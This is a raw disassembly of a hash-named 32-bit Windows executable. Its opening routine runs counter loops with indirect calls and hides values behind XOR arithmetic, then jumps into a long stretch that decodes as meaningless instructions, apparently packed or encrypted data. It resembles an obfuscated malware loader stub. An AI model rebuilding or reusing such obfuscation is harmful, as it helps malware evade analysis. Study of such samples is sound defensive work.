
b0516f45ae848a0d38f328af738c50953dde13373fb3d589f40b79d7f2d0e089.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x90
  401009:	push   esi
  40100a:	and    DWORD PTR ds:0x42a010,0x0
  401014:	jmp    0x401024
  401019:	mov    eax,ds:0x42a010
  40101e:	inc    eax
  40101f:	mov    ds:0x42a010,eax
  401024:	cmp    DWORD PTR ds:0x42a010,0x1d
  40102b:	jae    0x401072
  401031:	cmp    DWORD PTR ds:0x42a010,0xc
  401038:	jne    0x40104c
  40103e:	push   0x42900c
  401043:	push   DWORD PTR [ebp-0x18]
  401046:	call   DWORD PTR ds:0x424014
  40104c:	cmp    DWORD PTR ds:0x42a010,0xb
  401053:	jne    0x401067
  401059:	xor    eax,eax
  40105b:	xor    eax,DWORD PTR ds:0x42a010
  401061:	inc    eax
  401062:	mov    ds:0x42a010,eax
  401067:	jmp    0x401019
  40106c:	adc    ecx,0xcd5
  401072:	push   edi
  401073:	mov    DWORD PTR ds:0x42b004,0x1e
  40107d:	cmp    DWORD PTR ds:0x42b004,0x0
  401084:	je     0x4010e3
  40108a:	cmp    DWORD PTR ds:0x42b004,0x2b
  401091:	jne    0x4010bf
  401097:	push   DWORD PTR [ebp-0x10]
  40109a:	push   0x42b010
  40109f:	push   0x2447
  4010a4:	push   0x42b00c
  4010a9:	push   0x8949
  4010ae:	push   DWORD PTR [ebp-0x14]
  4010b1:	push   DWORD PTR [ebp-0x10]
  4010b4:	push   0x13a5
  4010b9:	call   DWORD PTR ds:0x424018
  4010bf:	xor    esi,esi
  4010c1:	or     esi,DWORD PTR ds:0x42b004
  4010c7:	dec    esi
  4010c8:	mov    DWORD PTR ds:0x42b004,esi
  4010ce:	jmp    0x40107d
  4010d3:	mov    eax,ds:0x42a004
  4010d8:	adc    eax,DWORD PTR ds:0x42b00c
  4010de:	mov    ds:0x42a004,eax
  4010e3:	mov    eax,ds:0x421912
  4010e8:	mov    DWORD PTR [ebp-0x2c],eax
  4010eb:	and    DWORD PTR ds:0x428010,0x0
  4010f5:	mov    ecx,DWORD PTR ds:0x428010
  4010fb:	inc    ecx
  4010fc:	mov    DWORD PTR ds:0x428010,ecx
  401102:	cmp    DWORD PTR ds:0x428010,0x2d
  401109:	jne    0x401118
  40110f:	push   DWORD PTR [ebp-0xc]
  401112:	call   DWORD PTR ds:0x42401c
  401118:	cmp    DWORD PTR ds:0x428010,0x1f
  40111f:	jb     0x4010f5
  401125:	mov    eax,ds:0x421a1e
  40112a:	and    DWORD PTR ds:0x42b008,ebx
  401130:	mov    DWORD PTR [ebp-0x3c],eax
  401133:	sbb    DWORD PTR ds:0x42b010,ebx
  401139:	and    DWORD PTR [ebp-0x34],0x0
  40113d:	or     eax,0x2114
  401142:	mov    DWORD PTR [ebp-0x20],0xf89c85b6
  401149:	xor    eax,eax
  40114b:	or     eax,DWORD PTR ds:0x429008
  401151:	xor    DWORD PTR ds:0x428008,eax
  401157:	mov    DWORD PTR [ebp-0x30],0xf89c85b5
  40115e:	mov    eax,DWORD PTR [ebp-0x1c]
  401161:	add    edi,DWORD PTR ds:0x429008
  401167:	mov    ecx,DWORD PTR [ebp-0x1c]
  40116a:	add    edi,esi
  40116c:	xor    eax,ecx
  40116e:	add    DWORD PTR ds:0x428024,edx
  401174:	mov    DWORD PTR [ebp-0x1c],eax
  401177:	and    DWORD PTR ds:0x42c000,0x0
  401181:	xor    eax,eax
  401183:	or     eax,DWORD PTR ds:0x42c000
  401189:	inc    eax
  40118a:	mov    ds:0x42c000,eax
  40118f:	cmp    DWORD PTR ds:0x42c000,0x19
  401196:	jne    0x4011a8
  40119c:	push   DWORD PTR [ebp-0x1c]
  40119f:	push   DWORD PTR [ebp-0xc]
  4011a2:	call   DWORD PTR ds:0x424020
  4011a8:	cmp    DWORD PTR ds:0x42c000,0x14
  4011af:	jb     0x401181
  4011b5:	or     DWORD PTR [ebp-0x1c],0xf89cb5b6
  4011bc:	xor    DWORD PTR ds:0x428014,0x3e14
  4011c6:	mov    eax,DWORD PTR [ebp-0x28]
  4011c9:	sbb    edi,ecx
  4011cb:	mov    ecx,DWORD PTR [ebp-0x28]
  4011ce:	and    DWORD PTR ds:0x42a008,0x0
  4011d8:	mov    esi,DWORD PTR ds:0x42a008
  4011de:	inc    esi
  4011df:	mov    DWORD PTR ds:0x42a008,esi
  4011e5:	cmp    DWORD PTR ds:0x42a008,0x7
  4011ec:	jne    0x40121a
  4011f2:	push   0x42b018
  4011f7:	push   0x2bd6
  4011fc:	push   DWORD PTR [ebp-0x14]
  4011ff:	push   0x428004
  401204:	push   DWORD PTR [ebp-0x20]
  401207:	push   0x42351e
  40120c:	push   0x1e5d
  401211:	push   DWORD PTR [ebp-0x28]
  401214:	call   DWORD PTR ds:0x424024
  40121a:	cmp    DWORD PTR ds:0x42a008,0x6
  401221:	jne    0x401234
  401227:	mov    esi,DWORD PTR ds:0x42a008
  40122d:	inc    esi
  40122e:	mov    DWORD PTR ds:0x42a008,esi
  401234:	cmp    DWORD PTR ds:0x42a008,0x16
  40123b:	jb     0x4011d8
  401241:	sub    DWORD PTR ds:0x42c00c,0x2ac6
  40124b:	xor    eax,ecx
  40124d:	dec    ecx
  40124e:	mov    DWORD PTR [ebp-0x28],eax
  401251:	and    DWORD PTR ds:0x428018,0x0
  40125b:	jmp    0x40126d
  401260:	mov    edi,DWORD PTR ds:0x428018
  401266:	inc    edi
  401267:	mov    DWORD PTR ds:0x428018,edi
  40126d:	cmp    DWORD PTR ds:0x428018,0x1f
  401274:	jae    0x4012b7
  40127a:	cmp    DWORD PTR ds:0x428018,0x11
  401281:	jne    0x401298
  401287:	push   0x4738
  40128c:	push   DWORD PTR [ebp-0x10]
  40128f:	push   DWORD PTR [ebp-0x24]
  401292:	call   DWORD PTR ds:0x424028
  401298:	cmp    DWORD PTR ds:0x428018,0x10
  40129f:	jne    0x4012b2
  4012a5:	mov    edi,DWORD PTR ds:0x428018
  4012ab:	inc    edi
  4012ac:	mov    DWORD PTR ds:0x428018,edi
  4012b2:	jmp    0x401260
  4012b7:	add    DWORD PTR [ebp-0x28],0xf89f05b6
  4012be:	mov    eax,DWORD PTR [ebp-0x18]
  4012c1:	and    DWORD PTR ds:0x428020,0x0
  4012cb:	mov    ecx,DWORD PTR ds:0x428020
  4012d1:	inc    ecx
  4012d2:	mov    DWORD PTR ds:0x428020,ecx
  4012d8:	cmp    DWORD PTR ds:0x428020,0x15
  4012df:	jne    0x4012f5
  4012e5:	push   0x4235e5
  4012ea:	push   0x423669
  4012ef:	call   DWORD PTR ds:0x424030
  4012f5:	cmp    DWORD PTR ds:0x428020,0x14
  4012fc:	jb     0x4012cb
  401302:	mov    ecx,DWORD PTR [ebp-0x18]
  401305:	and    DWORD PTR ds:0x42b000,0x0
  40130f:	jmp    0x401321
  401314:	mov    edi,DWORD PTR ds:0x42b000
  40131a:	inc    edi
  40131b:	mov    DWORD PTR ds:0x42b000,edi
  401321:	cmp    DWORD PTR ds:0x42b000,0x19
  401328:	jae    0x401378
  40132e:	cmp    DWORD PTR ds:0x42b000,0xa
  401335:	jne    0x401359
  40133b:	push   DWORD PTR [ebp-0x18]
  40133e:	push   0x3609
  401343:	push   DWORD PTR [ebp-0xc]
  401346:	push   DWORD PTR [ebp-0x18]
  401349:	push   0x6b70
  40134e:	push   0x42901c
  401353:	call   DWORD PTR ds:0x424038
  401359:	cmp    DWORD PTR ds:0x42b000,0x9
  401360:	jne    0x401373
  401366:	mov    edi,DWORD PTR ds:0x42b000
  40136c:	inc    edi
  40136d:	mov    DWORD PTR ds:0x42b000,edi
  401373:	jmp    0x401314
  401378:	xor    eax,ecx
  40137a:	mov    DWORD PTR [ebp-0x18],eax
  40137d:	add    DWORD PTR [ebp-0x18],0xf89c85f6
  401384:	mov    eax,DWORD PTR [ebp-0x24]
  401387:	mov    ecx,DWORD PTR [ebp-0x24]
  40138a:	xor    eax,ecx
  40138c:	mov    DWORD PTR [ebp-0x24],eax
  40138f:	add    DWORD PTR [ebp-0x24],0xf89c85d6
  401396:	mov    eax,DWORD PTR [ebp-0x14]
  401399:	mov    ecx,DWORD PTR [ebp-0x14]
  40139c:	xor    eax,ecx
  40139e:	mov    DWORD PTR [ebp-0x14],eax
  4013a1:	mov    eax,DWORD PTR [ebp-0x20]
  4013a4:	mov    ecx,DWORD PTR [ebp-0x14]
  4013a7:	mov    esi,0x7510893
  4013ac:	xor    eax,esi
  4013ae:	mov    edi,0x3272db
  4013b3:	add    eax,edi
  4013b5:	xor    eax,ecx
  4013b7:	mov    DWORD PTR [ebp-0x14],eax
  4013ba:	mov    eax,DWORD PTR [ebp-0x10]
  4013bd:	mov    ecx,DWORD PTR [ebp-0x10]
  4013c0:	sub    eax,ecx
  4013c2:	mov    DWORD PTR [ebp-0x10],eax
  4013c5:	add    DWORD PTR [ebp-0x10],0xf89c85b9
  4013cc:	mov    al,BYTE PTR [ebp-0x1]
  4013cf:	movzx  ecx,BYTE PTR [ebp-0x1]
  4013d3:	movzx  eax,al
  4013d6:	sub    ecx,eax
  4013d8:	mov    BYTE PTR [ebp-0x1],cl
  4013db:	movzx  eax,BYTE PTR [ebp-0x1]
  4013df:	xor    eax,0xffffff99
  4013e2:	mov    BYTE PTR [ebp-0x1],al
  4013e5:	mov    eax,DWORD PTR [ebp-0x20]
  4013e8:	xor    eax,esi
  4013ea:	add    eax,edi
  4013ec:	mov    DWORD PTR [ebp-0x14],eax
  4013ef:	lea    eax,[ebp-0x40]
  4013f2:	mov    DWORD PTR [ebp-0x38],eax
  4013f5:	lea    eax,[ebp-0x38]
  4013f8:	mov    DWORD PTR [ebp-0x44],eax
  4013fb:	lea    eax,[ebp-0x44]
  4013fe:	mov    DWORD PTR [ebp-0x8],eax
  401401:	lea    eax,[ebp-0x8]
  401404:	mov    DWORD PTR [ebp-0x48],eax
  401407:	mov    eax,DWORD PTR [ebp-0x18]
  40140a:	xor    eax,esi
  40140c:	add    eax,edi
  40140e:	push   eax
  40140f:	mov    eax,DWORD PTR [ebp-0x1c]
  401412:	xor    eax,esi
  401414:	add    eax,edi
  401416:	push   eax
  401417:	mov    eax,DWORD PTR [ebp-0x10]
  40141a:	xor    eax,esi
  40141c:	add    eax,edi
  40141e:	push   eax
  40141f:	lea    eax,[ebp-0x90]
  401425:	push   eax
  401426:	push   DWORD PTR [ebp-0x20]
  401429:	push   DWORD PTR [ebp-0x30]
  40142c:	call   0x40914a
  401431:	test   eax,eax
  401433:	je     0x401464
  401439:	lea    eax,[ebp-0x90]
  40143f:	push   eax
  401440:	mov    eax,DWORD PTR [ebp-0x30]
  401443:	xor    eax,esi
  401445:	add    eax,edi
  401447:	push   eax
  401448:	mov    eax,DWORD PTR [ebp-0x2c]
  40144b:	add    eax,0xaa
  401450:	push   eax
  401451:	mov    eax,DWORD PTR [ebp-0x2c]
  401454:	mov    eax,DWORD PTR [eax+0x198]
  40145a:	push   DWORD PTR [eax]
  40145c:	call   0x405c6f
  401461:	mov    DWORD PTR [ebp-0x40],eax
  401464:	lea    eax,[ebp+0x4]
  401467:	mov    DWORD PTR [ebp-0x34],eax
  40146a:	mov    eax,DWORD PTR [ebp-0x8]
  40146d:	mov    eax,DWORD PTR [eax]
  40146f:	mov    eax,DWORD PTR [eax]
  401471:	mov    eax,DWORD PTR [eax]
  401473:	test   eax,eax
  401475:	je     0x4038ab
  40147b:	lea    eax,[ebp-0xc]
  40147e:	mov    DWORD PTR [ebp-0x4c],eax
  401481:	mov    eax,DWORD PTR [ebp-0x3c]
  401484:	mov    DWORD PTR [ebp-0xc],eax
  401487:	mov    eax,DWORD PTR [ebp-0x8]
  40148a:	mov    eax,DWORD PTR [eax]
  40148c:	mov    eax,DWORD PTR [eax]
  40148e:	mov    eax,DWORD PTR [eax]
  401490:	sub    DWORD PTR [ebp-0xc],eax
  401493:	mov    ecx,DWORD PTR [ebp-0x10]
  401496:	xor    ecx,esi
  401498:	mov    eax,0xffcd8d25
  40149d:	sub    eax,ecx
  40149f:	jmp    0x403854
  4014a4:	out    dx,al
  4014a5:	add    eax,0x6723a723
  4014aa:	outs   dx,BYTE PTR ds:[esi]
  4014ab:	sbb    DWORD PTR [edx+0x1b],0xf
  4014af:	hlt    
  4014b0:	pop    ds
  4014b1:	stos   DWORD PTR es:[edi],eax
  4014b2:	xor    al,0xcd
  4014b4:	bound  esp,QWORD PTR [edx+0x62]
  4014b7:	(bad)  
  4014b8:	retf   0x625f
  4014bb:	bound  ecx,QWORD PTR [ecx]
  4014bd:	sub    eax,DWORD PTR [edi]
  4014bf:	pop    edx
  4014c0:	add    eax,0x792c0356
  4014c5:	pop    ebx
  4014c6:	jne    0x40150f
  4014c8:	bound  edx,QWORD PTR [edx+0x25714472]
  4014ce:	iret   
  4014cf:	retf   
  4014d0:	hlt    
  4014d1:	inc    ebp
  4014d2:	aam    0x97
  4014d4:	cdq    
  4014d5:	add    ebp,DWORD PTR [edx]
  4014d7:	pop    esp
  4014d8:	jno    0x401544
  4014da:	mov    es,WORD PTR [edx-0x43be3b9c]
  4014e0:	daa    
  4014e1:	mov    ecx,0x54f9627
  4014e6:	shr    BYTE PTR [ebp+eax*1+0x2],1
  4014ea:	adc    cl,al
  4014ec:	(bad)  
  4014ed:	(bad)  [esi-0x78]
  4014f0:	and    BYTE PTR [esi+0x31c900b0],dl
  4014f6:	dec    esi
  4014f7:	fbstp  TBYTE PTR [edx-0x62cc368d]
  4014fd:	mov    cs,WORD PTR [eax+0x78]
  401500:	jo     0x4014b8
  401502:	dec    edi
  401503:	pushf  
  401504:	pop    eax
  401505:	jae    0x401491
  401507:	sti    
  401508:	push   es
  401509:	push   0xc72c3d54
  40150e:	pop    esi
  40150f:	cmp    BYTE PTR [edx+0x6c],dl
  401512:	add    ecx,DWORD PTR [edi]
  401514:	push   ss
  401515:	jge    0x40153e
  401517:	mov    ebx,0xa6ab63c3
  40151c:	mov    esp,0xc531c291
  401521:	stc    
  401522:	inc    ebx
  401523:	popf   
  401524:	xchg   edx,eax
  401525:	in     eax,0x12
  401527:	fstp   QWORD PTR [edx]
  401529:	jg     0x4014c9
  40152b:	cmp    ecx,edi
  40152d:	mov    al,ds:0xdb808269
  401532:	dec    ecx
  401533:	loop   0x4014ee
  401535:	inc    eax
  401536:	or     BYTE PTR [ebx],0x2c
  401539:	inc    ebx
  40153a:	pop    ecx
  40153b:	mov    ecx,0xda183803
  401540:	xor    ebx,DWORD PTR [esi+0x22]
  401543:	sbb    ch,BYTE PTR [ebx+ecx*1]
  401546:	inc    esi
  401547:	add    esp,DWORD PTR [eax-0x32d94fe1]
  40154d:	dec    ebp
  40154e:	nop
  40154f:	xchg   edi,eax
  401550:	dec    esi
  401551:	mov    cl,0x25
  401553:	pop    ecx
  401554:	les    ebp,FWORD PTR [eax]
  401556:	sub    eax,ecx
  401558:	vpsubusw xmm0,xmm7,XMMWORD PTR [edi-0x25]
  40155d:	mov    edi,0xdb06d0ab
  401562:	test   al,0x7e
  401564:	bound  edx,QWORD PTR [ebp+0x268b1b46]
  40156a:	in     eax,0xc2
  40156c:	push   ds
  40156d:	sub    DWORD PTR [ebp+0x6c],0x51
  401571:	imul   ebp,edx,0x52d00cb4
  401577:	ds jp  0x401572
  40157a:	jbe    0x4015da
  40157c:	cmp    DWORD PTR [edi-0x2641bd01],0xa0c135b5
  401586:	(bad)  
  401587:	scas   eax,DWORD PTR es:[edi]
  401588:	inc    esi
  401589:	mov    edx,0xc0d23141
  40158e:	or     al,0xc7
  401590:	pop    edi
  401591:	xchg   esp,eax
  401592:	dec    ebp
  401593:	mov    esi,0x2003399
  401598:	scas   al,BYTE PTR es:[edi]
  401599:	mov    esi,DWORD PTR [edi]
  40159b:	loope  0x40158b
  40159d:	(bad)  
  40159e:	pop    esi
  40159f:	data16 sbb bl,0x37
  4015a3:	mov    eax,0xc2dc3afc
  4015a8:	int3   
  4015a9:	test   DWORD PTR [edx-0x11],esp
  4015ac:	(bad)  
  4015ad:	hlt    
  4015ae:	xchg   esp,eax
  4015af:	ins    BYTE PTR es:[edi],dx
  4015b0:	mov    DWORD PTR [eax+0x7f],edi
  4015b3:	les    ebx,FWORD PTR [eax+ebx*8+0x7fa15909]
  4015ba:	jns    0x401541
  4015bc:	xor    ebp,esi
  4015be:	sub    al,al
  4015c0:	call   0xf190:0xc4756853
  4015c7:	dec    esp
  4015c8:	repz ja 0x40158e
  4015cb:	pusha  
  4015cc:	neg    edi
  4015ce:	dec    ebp
  4015cf:	add    al,0x97
  4015d1:	xchg   esi,eax
  4015d2:	sbb    ax,0x7da2
  4015d6:	or     BYTE PTR [ebp-0x68ff511e],dl
  4015dc:	add    al,0x27
  4015de:	test   BYTE PTR [ebx],ah
  4015e0:	cmp    al,0x11
  4015e2:	xor    bh,ah
  4015e4:	xchg   ebx,eax
  4015e5:	mov    ebp,0xb83a6afd
  4015ea:	test   DWORD PTR [edi],esp
  4015ec:	(bad)  
  4015ee:	sbb    eax,0x18eaccc3
  4015f3:	mov    al,0xa8
  4015f5:	jnp    0x401651
  4015f7:	ins    BYTE PTR es:[edi],dx
  4015f8:	loop   0x401594
  4015fa:	push   cs
  4015fb:	fmul   st,st(0)
  4015fd:	jb     0x401673
  4015ff:	add    al,0xc1
  401601:	imul   ecx,DWORD PTR [ecx],0xffffffc2
  401604:	inc    esi
  401605:	shr    edi,cl
  401607:	adc    al,0xff
  401609:	pop    edi
  40160a:	xchg   edx,eax
  40160b:	xchg   esp,eax
  40160c:	jge    0x401622
  40160e:	rcr    esp,1
  401610:	ret    0x38ae
  401613:	pop    ds
  401614:	js     0x4015bc
  401616:	std    
  401617:	push   ebp
  401618:	dec    esp
  401619:	ret    0x8d03
  40161c:	dec    eax
  40161d:	hlt    
  40161e:	inc    esp
  40161f:	test   dl,0xca
  401622:	xor    BYTE PTR [edi],ah
  401624:	mov    dl,0xb6
  401626:	outs   dx,DWORD PTR ds:[esi]
  401627:	(bad)  
  40162a:	ror    BYTE PTR [eax-0x4],0x90
  40162e:	xchg   DWORD PTR [eax+0x29],edx
  401631:	shr    DWORD PTR [eax],0xdf
  401634:	push   es
  401635:	scas   al,BYTE PTR es:[edi]
  401636:	sbb    DWORD PTR [ecx+0x2733381b],0xffffff95
  40163d:	pop    ds
  40163e:	sub    eax,0xc133ef66
  401643:	test   BYTE PTR [edx-0xbd3b2fc],ch
  401649:	xchg   esi,eax
  40164a:	mov    bh,0x91
  40164c:	mov    ah,0xcb
  40164e:	fdivrp st(4),st
  401650:	and    al,0xff
  401652:	xlat   BYTE PTR ds:[ebx]
  401653:	out    0x70,eax
  401655:	push   edi
  401656:	mov    ds:0x720040ad,eax
  40165b:	shr    DWORD PTR ds:[edx-0x77],1
  40165f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401660:	in     eax,0x88
  401662:	jo     0x401699
  401664:	(bad)  
  401665:	mov    ah,0xb6
  401667:	mov    gs,esi
  401669:	push   DWORD PTR [ecx+ebx*1]
  40166c:	and    ecx,0x1c
  40166f:	ins    BYTE PTR es:[edi],dx
  401670:	push   esi
  401671:	rcl    DWORD PTR [ebp+0x181e7de8],0xa5
  401678:	fmul   QWORD PTR [ebx+0x288929aa]
  40167e:	inc    ebp
  40167f:	shr    BYTE PTR [esi-0x5b],1
  401682:	cwde   
  401683:	inc    esi
  401684:	sub    BYTE PTR [esi-0x56fb825],0x65
  40168b:	fldenv [ebx-0x48a9813]
  401691:	sbb    al,bh
  401693:	daa    
  401694:	inc    ecx
  401695:	fisttp WORD PTR [ecx]
  401697:	lds    ebx,FWORD PTR [edx+0x37dd0c92]
  40169d:	popa   
  40169e:	inc    edi
  40169f:	xchg   bh,dl
  4016a1:	sub    al,0xed
  4016a3:	cmp    BYTE PTR [ebx-0x3e],0xd2
  4016a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4016a8:	(bad)  
  4016a9:	sar    BYTE PTR [eax+ebx*4],0xfb
  4016ad:	mov    ebp,DWORD PTR [edi-0x5eb47410]
  4016b3:	fwait
  4016b4:	mov    edi,0x1a9ca5ec
  4016b9:	pop    ds
  4016ba:	dec    ecx
  4016bb:	xor    ch,cl
  4016bd:	pop    esi
  4016be:	sahf   
  4016bf:	jnp    0x401696
  4016c1:	scas   al,BYTE PTR es:[edi]
  4016c2:	xchg   ecx,eax
  4016c3:	int    0x33
  4016c5:	loop   0x401718
  4016c7:	xchg   DWORD PTR [edi],esi
  4016c9:	cli    
  4016ca:	dec    ebp
  4016cc:	pusha  
  4016cd:	ret    
  4016ce:	ins    DWORD PTR es:[edi],dx
  4016cf:	(bad)  [ecx-0x535c883d]
  4016d5:	push   ebx
  4016d6:	or     BYTE PTR [esi-0x2a],al
  4016d9:	mov    ecx,0xd34164d9
  4016de:	adc    BYTE PTR [ebp-0x4087cd4b],cl
  4016e4:	(bad)  
  4016e5:	call   0xbfbdcea
  4016ea:	sbb    DWORD PTR [ebx],0x26
  4016ed:	je     0x40173b
  4016ef:	xchg   esi,eax
  4016f0:	(bad)  
  4016f1:	in     al,0x7d
  4016f3:	retf   0xef14
  4016f6:	mov    ebx,0xa4de8256
  4016fb:	data16 je 0x4016ec
  4016fe:	dec    edx
  4016ff:	out    0x28,eax
  401701:	cdq    
  401702:	add    ch,BYTE PTR [edx+ebx*4-0x1046f08b]
  401709:	daa    
  40170a:	ins    DWORD PTR es:[edi],dx
  40170b:	icebp  
  40170c:	aam    0xa5
  40170e:	lea    ecx,[esi]
  401710:	shl    dh,1
  401712:	arpl   WORD PTR [esi-0x51],sp
  401715:	dec    esi
  401716:	adc    al,0xd7
  401718:	jne    0x401780
  40171a:	(bad)  [edi]
  40171c:	sub    ecx,DWORD PTR [edi-0x36]
  40171f:	cmp    DWORD PTR [ebx-0xbdae41a],edi
  401725:	push   ebx
  401726:	push   0xffffffc5
  401728:	cmp    ebp,DWORD PTR [ebp+0x6f2e9766]
  40172e:	pop    ecx
  40172f:	mov    eax,0x187e6f7
  401734:	inc    eax
  401735:	xchg   ebx,eax
  401736:	ss ds mov esp,0x740b1ddf
  40173d:	sub    al,0x34
  40173f:	in     al,0x17
  401741:	xchg   ebx,eax
  401742:	scas   eax,DWORD PTR es:[edi]
  401743:	int3   
  401744:	sub    DWORD PTR [edx+0x68aa79bb],edi
  40174a:	shr    al,cl
  40174c:	dec    ebp
  40174d:	and    eax,DWORD PTR [eax+0x48783e79]
  401753:	push   ss
  401754:	inc    ebx
  401755:	xor    eax,0x469584e5
  40175a:	inc    ecx
  40175b:	(bad)  
  40175c:	adc    edx,DWORD PTR [edx]
  40175e:	pop    ds
  40175f:	pusha  
  401760:	sti    
  401761:	aad    0x50
  401763:	jbe    0x401762
  401765:	mov    ah,0x37
  401767:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401768:	mov    bl,0x9e
  40176a:	xchg   ecx,eax
  40176b:	bound  eax,QWORD PTR [ecx-0x39d613fb]
  401771:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401772:	ins    DWORD PTR es:[edi],dx
  401773:	gs shl ebp,cl
  401776:	(bad)  
  401777:	jecxz  0x401730
  401779:	lods   al,BYTE PTR ds:[esi]
  40177a:	outs   dx,BYTE PTR ds:[esi]
  40177b:	test   al,0xc5
  40177d:	inc    esi
  40177e:	add    BYTE PTR [edi-0x37],ah
  401781:	retf   
  401782:	out    0x87,eax
  401784:	adc    al,0xd
  401786:	xlat   BYTE PTR ds:[ebx]
  401787:	mov    ecx,esp
  401789:	(bad)  
  40178a:	out    dx,eax
  40178b:	pop    es
  40178c:	push   esp
  40178d:	xchg   ebp,eax
  40178e:	clc    
  40178f:	test   dh,dh
  401791:	mov    dl,BYTE PTR [ecx+ecx*4-0x7]
  401795:	mov    ah,0xe3
  401797:	pushf  
  401798:	mov    ah,0xa0
  40179a:	mov    ecx,0xfd19f36e
  40179f:	and    eax,0x623a56cb
  4017a4:	cwde   
  4017a5:	mov    BYTE PTR [edx-0x48],bh
  4017a8:	(bad)  
  4017a9:	mov    edx,0xc9c0bb5d
  4017ae:	call   0xb02b:0x26de3282
  4017b5:	adc    ebp,DWORD PTR [ebx+0x78e7c51b]
  4017bb:	mul    DWORD PTR [eax+0x56b3ddb2]
  4017c1:	jl     0x401777
  4017c3:	test   eax,edx
  4017c5:	jbe    0x401773
  4017c7:	or     dh,BYTE PTR [edi-0x11f54463]
  4017cd:	jmp    0xef99cfb8
  4017d2:	add    DWORD PTR [edx],ecx
  4017d4:	mov    BYTE PTR [edx+0x6c9ff2d7],bh
  4017da:	aas    
  4017db:	cmp    eax,0x122550ce
  4017e0:	jns    0x401831
  4017e2:	xchg   edx,eax
  4017e3:	ror    DWORD PTR [eax],cl
  4017e5:	mov    al,0x78
  4017e7:	inc    eax
  4017e8:	xchg   ecx,eax
  4017e9:	icebp  
  4017ea:	xchg   ecx,eax
  4017eb:	xor    DWORD PTR [ecx+0x30],0xffffff92
  4017ef:	cwde   
  4017f0:	bound  ebx,QWORD PTR [ebp-0x2e349398]
  4017f6:	shl    BYTE PTR [edi-0x18],1
  4017f9:	cmp    eax,0x13a07a29
  4017fe:	jbe    0x4017b2
  401800:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401801:	mov    DWORD PTR [edx-0x22f182aa],edx
  401807:	pop    ds
  401808:	cmp    ah,BYTE PTR [ebp+0x29]
  40180b:	jbe    0x4017d0
  40180d:	(bad)  
  40180e:	push   esi
  40180f:	push   ebx
  401810:	ret    0x8a11
  401813:	mov    ah,0x8d
  401815:	jae    0x4017dc
  401817:	aam    0x3a
  401819:	imul   ecx,ebp,0xfffffffc
  40181c:	(bad)  
  40181d:	pop    ecx
  40181e:	sbb    al,dl
  401820:	push   ecx
  401821:	jns    0x401844
  401823:	js     0x4017cb
  401825:	shl    BYTE PTR [esi],cl
  401827:	stos   DWORD PTR es:[edi],eax
  401828:	add    eax,esi
  40182a:	stc    
  40182b:	ret    0x50b7
  40182e:	fisub  DWORD PTR [ecx+edx*4]
  401831:	pop    edi
  401832:	in     al,0x2a
  401834:	test   ecx,edi
  401836:	(bad)  
  401837:	loopne 0x4017ce
  401839:	lahf   
  40183a:	dec    esi
  40183b:	mov    eax,0xef2746cc
  401840:	jmp    0x37deec60
  401845:	popf   
  401846:	pop    edx
  401847:	int3   
  401848:	mov    esi,0xd21331c6
  40184d:	sahf   
  40184e:	xor    dh,BYTE PTR [ecx]
  401850:	jge    0x40182d
  401852:	pop    esi
  401853:	sub    al,0xd8
  401855:	sbb    BYTE PTR [ebp-0x268bc9a7],bh
  40185b:	sbb    eax,0x2fe5ef9f
  401860:	mov    eax,ds:0x5c8e81cc
  401865:	mov    al,0x1a
  401867:	mov    BYTE PTR [ecx-0x10],dl
  40186a:	push   ecx
  40186b:	mov    ch,BYTE PTR [edi-0x36]
  40186e:	cmp    cl,ah
  401870:	test   BYTE PTR [eax-0x6e],ah
  401873:	scas   eax,DWORD PTR es:[edi]
  401874:	ins    DWORD PTR es:[edi],dx
  401875:	lods   al,BYTE PTR cs:[esi]
  401877:	add    ch,dl
  401879:	inc    esp
  40187a:	cmp    ecx,DWORD PTR [ebx+0x4995e393]
  401880:	and    esi,DWORD PTR [edi]
  401882:	pop    edx
  401883:	aad    0x5f
  401885:	xor    eax,0xc7fa1972
  40188a:	sbb    BYTE PTR [ecx-0x63cd0151],ah
  401890:	push   es
  401891:	inc    edx
  401892:	dec    esi
  401893:	ror    ch,0xd6
  401896:	jp     0x4018bb
  401898:	sahf   
  401899:	test   DWORD PTR [eax+0x78],ecx
  40189c:	dec    ecx
  40189d:	inc    edi
  40189e:	pop    ebp
  40189f:	push   cs
  4018a0:	cmp    BYTE PTR [ebx-0x32],0xff
  4018a4:	adc    DWORD PTR [esi+0x473660c1],esi
  4018aa:	mov    dl,0x8c
  4018ac:	into   
  4018ad:	pop    esp
  4018ae:	and    bl,BYTE PTR [ebp-0x6f93e0b7]
  4018b4:	test   BYTE PTR [esp+edi*4+0x70046015],0x80
  4018bc:	loop   0x4018af
  4018be:	dec    edi
  4018bf:	mov    ecx,0xbb9336c5
  4018c4:	sahf   
  4018c5:	ficom  DWORD PTR [ebx+ebx*8+0x4a]
  4018c9:	xor    esi,DWORD PTR [edi-0x63579ef9]
  4018cf:	iret   
  4018d0:	fld    DWORD PTR [edi]
  4018d2:	mov    edi,0x3ce4b7de
  4018d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4018d8:	(bad)  
  4018d9:	jmp    0x401879
  4018db:	in     eax,dx
  4018dc:	rol    dl,cl
  4018de:	ins    BYTE PTR es:[edi],dx
  4018df:	aas    
  4018e0:	xchg   al,al
  4018e2:	repnz cmp DWORD PTR [eax+0x31ec7992],esi
  4018e9:	data16 mov ch,0xe4
  4018ec:	push   0xdcb7068b
  4018f1:	mov    ds:0x57ec8575,eax
  4018f6:	test   BYTE PTR [esi-0x3c],bh
  4018f9:	or     eax,0x18acd650
  4018fe:	cmp    cl,al
  401900:	sbb    eax,0x6728565
  401905:	popa   
  401906:	fwait
  401907:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401908:	sub    eax,DWORD PTR [eax-0xeb7bf7d]
  40190e:	sbb    dh,dl
  401910:	jbe    0x40196a
  401912:	push   cs
  401913:	call   0x21b6ab59
  401918:	xchg   BYTE PTR [ecx+0x51],cl
  40191b:	nop
  40191c:	fcmove st,st(3)
  40191e:	adc    dl,ah
  401920:	push   ebp
  401921:	jno    0x40194c
  401923:	mov    bh,0x4f
  401925:	outs   dx,DWORD PTR ds:[esi]
  401926:	mov    ebp,0x1a7c1d12
